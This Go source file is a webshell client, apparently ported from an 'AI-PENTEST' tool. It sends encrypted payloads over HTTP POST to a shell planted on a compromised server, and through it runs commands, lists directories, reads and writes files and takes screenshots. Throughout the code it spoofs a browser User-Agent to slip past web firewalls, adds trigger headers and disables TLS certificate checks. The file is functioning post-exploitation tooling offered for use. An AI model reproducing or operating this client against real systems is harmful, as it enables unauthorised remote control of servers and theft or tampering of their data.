package webshell

// client.go — Webshell HTTP 加密通信客户端（移植自 AI-PENTEST webshell/client.py）。
// 流程：build_payload → encoder 加密 → POST → 解密响应（失败按明文兜底）→ parse。

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
)

// Result 一次调用返回的结构化结果（对应 Python parse_response 的 dict）。
type Result struct {
	OK     bool   `json:"ok"`
	Output string `json:"output"`
	CWD    string `json:"cwd"`
	Data   []byte `json:"-"`
	Error  string `json:"error,omitempty"`
}

// smartDecode Windows 中文版命令输出 GBK，Linux UTF-8。UTF-8 strict → GBK strict → GBK replace。
func smartDecode(raw []byte) string {
	if len(raw) == 0 {
		return ""
	}
	if utf8.Valid(raw) {
		return string(raw)
	}
	if dec, err := simplifiedchinese.GBK.NewDecoder().Bytes(raw); err == nil {
		return string(dec)
	}
	// GBK replace：逐字节尽力解码，失败字节替换
	var b strings.Builder
	for i := 0; i < len(raw); {
		if raw[i] < 0x80 {
			b.WriteByte(raw[i])
			i++
			continue
		}
		if i+1 < len(raw) {
			if dec, err := simplifiedchinese.GBK.NewDecoder().Bytes(raw[i : i+2]); err == nil {
				b.Write(dec)
				i += 2
				continue
			}
		}
		b.WriteRune('\uFFFD')
		i++
	}
	return b.String()
}

// Parse 解析 shell 响应。
func Parse(raw []byte, op string) Result {
	text := smartDecode(raw)
	res := Result{OK: true}

	if op == "test" {
		if strings.Contains(text, PongMarker) {
			after := strings.SplitN(text, PongMarker, 2)[1]
			nonce := after
			if strings.Contains(after, EndMarker) {
				nonce = strings.SplitN(after, EndMarker, 2)[0]
			}
			res.Output = strings.Trim(strings.Trim(strings.TrimSpace(nonce), "_"), "\" ")
			return res
		}
		preview := text
		if len(preview) > 200 {
			preview = preview[:200]
		}
		return Result{OK: false, Error: "no PONG marker in response: " + preview}
	}

	body := text
	if strings.Contains(text, EndMarker) {
		body = strings.SplitN(text, EndMarker, 2)[0]
	}

	if op == "exec" {
		if strings.Contains(body, CWDMarker) {
			parts := strings.SplitN(body, CWDMarker, 2)
			res.Output = strings.TrimRight(strings.TrimRight(parts[0], "\n"), " ")
			cwdTail := ""
			if len(parts) > 1 {
				cwdTail = parts[1]
			}
			if strings.Contains(cwdTail, "__") {
				cwdTail = strings.SplitN(cwdTail, "__", 2)[0]
			}
			res.CWD = strings.TrimSpace(cwdTail)
		} else {
			res.Output = body
		}
		if strings.HasPrefix(res.Output, "ERROR") {
			res.OK = false
			res.Error = strings.TrimSpace(strings.TrimPrefix(strings.TrimPrefix(res.Output, "ERROR"), ":"))
			res.Output = ""
		}
		return res
	}

	stripped := strings.TrimSpace(body)
	if strings.HasPrefix(stripped, "ERROR") {
		res.OK = false
		res.Error = strings.TrimSpace(strings.TrimPrefix(strings.TrimPrefix(stripped, "ERROR"), ":"))
		return res
	}
	res.Output = body

	if op == "read" {
		data, err := base64Decode(stripped)
		if err != nil {
			return Result{OK: false, Error: "base64 decode failed: " + err.Error()}
		}
		res.Data = data
		res.Output = ""
	}
	if op == "list" {
		res.Data = []byte(strings.TrimSpace(stripped))
	}
	return res
}

func base64Decode(s string) ([]byte, error) {
	s = strings.TrimSpace(s)
	if d, err := base64.StdEncoding.DecodeString(s); err == nil {
		return d, nil
	}
	return base64.URLEncoding.DecodeString(s)
}

// Client 一次性通信客户端（每次调用新建，与原实现一致）。
type Client struct {
	URL        string
	Password   string
	Encoder    string // raw/aes/xor/form-cmd
	ScriptType string // php/jsp/jspx/asp/aspx/py/node
	Timeout    time.Duration
	VerifyTLS  bool
	Cwd        string
	// ExtraHeaders 附加请求头：Header Gate（服务端生成时校验的触发头）与 UA 伪装等。
	ExtraHeaders map[string]string
}

// RoundTrip 构造 payload → 加密往返 → 解密响应 → 解析。
func (c *Client) RoundTrip(op string, params P) (Result, error) {
	code, err := BuildPayload(c.ScriptType, op, params)
	if err != nil {
		return Result{}, err
	}
	enc, err := GetEncoder(c.Encoder)
	if err != nil {
		return Result{}, err
	}
	body, err := enc.Encrypt([]byte(code), c.Password)
	if err != nil {
		return Result{}, fmt.Errorf("加密失败: %w", err)
	}

	timeout := c.Timeout
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	tr := &http.Transport{}
	if !c.VerifyTLS {
		tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} //nolint:gosec // 渗透场景常见自签证书
	}
	cli := &http.Client{Timeout: timeout, Transport: tr}
	req, err := http.NewRequest(http.MethodPost, c.URL, strings.NewReader(string(body)))
	if err != nil {
		return Result{}, err
	}
	// 蚁剑 UA，避免被简单 WAF 拦
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	if ct := enc.ContentType(); ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	for k, v := range c.ExtraHeaders {
		if k != "" && v != "" {
			req.Header.Set(k, v)
		}
	}
	resp, err := cli.Do(req)
	if err != nil {
		return Result{}, fmt.Errorf("请求失败: %w", err)
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return Result{}, fmt.Errorf("读响应失败: %w", err)
	}
	// 解密响应（原实现约定：响应通常明文，解密失败原样返回）
	dec := enc.Decrypt(raw, c.Password)
	if !strings.Contains(smartDecode(dec), EndMarker) && strings.Contains(smartDecode(raw), EndMarker) {
		dec = raw
	}
	return Parse(dec, op), nil
}

// Test 探测连通性。
func (c *Client) Test() (Result, error) { return c.RoundTrip("test", P{}) }

// ExecCmd 执行命令（exec）。
func (c *Client) ExecCmd(cmd string) (Result, error) {
	return c.RoundTrip("exec", P{Cmd: cmd, Cwd: c.Cwd})
}

// ListDir 列目录。
func (c *Client) ListDir(path string) (Result, error) { return c.RoundTrip("list", P{Path: path}) }

// ReadFile 读文件（Data 为文件字节）。
func (c *Client) ReadFile(path string) (Result, error) { return c.RoundTrip("read", P{Path: path}) }

// WriteFile 写文件（文本或 base64 二进制 data）。
func (c *Client) WriteFile(path, content string, b64Data string) (Result, error) {
	return c.RoundTrip("write", P{Path: path, Content: content, B64Data: b64Data})
}

// RoundTripExt 插件操作往返：ExtBuild 构造 payload → 加密 → 解析。
// screenshot 特例：输出 IMG:<base64>，剥前缀填入 Data。
func (c *Client) RoundTripExt(op string, p ExtParams) (Result, error) {
	code, err := ExtBuild(c.ScriptType, op, p)
	if err != nil {
		return Result{}, err
	}
	enc, err := GetEncoder(c.Encoder)
	if err != nil {
		return Result{}, err
	}
	body, err := enc.Encrypt([]byte(code), c.Password)
	if err != nil {
		return Result{}, err
	}
	timeout := c.Timeout
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	tr := &http.Transport{}
	if !c.VerifyTLS {
		tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} //nolint:gosec
	}
	cli := &http.Client{Timeout: timeout, Transport: tr}
	req, err := http.NewRequest(http.MethodPost, c.URL, strings.NewReader(string(body)))
	if err != nil {
		return Result{}, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	if ct := enc.ContentType(); ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	for k, v := range c.ExtraHeaders {
		if k != "" && v != "" {
			req.Header.Set(k, v)
		}
	}
	resp, err := cli.Do(req)
	if err != nil {
		return Result{}, err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 32<<20))
	if err != nil {
		return Result{}, err
	}
	dec := enc.Decrypt(raw, c.Password)
	if !strings.Contains(smartDecode(dec), EndMarker) && strings.Contains(smartDecode(raw), EndMarker) {
		dec = raw
	}
	res := Parse(dec, op)
	// 插件输出约定：非 test 操作统一以 JSON/文本进 Output；screenshot 剥 IMG: 前缀
	if strings.HasPrefix(res.Output, "IMG:") {
		res.Data, _ = base64.StdEncoding.DecodeString(strings.TrimPrefix(res.Output, "IMG:"))
		res.Output = ""
	}
	return res, nil
}
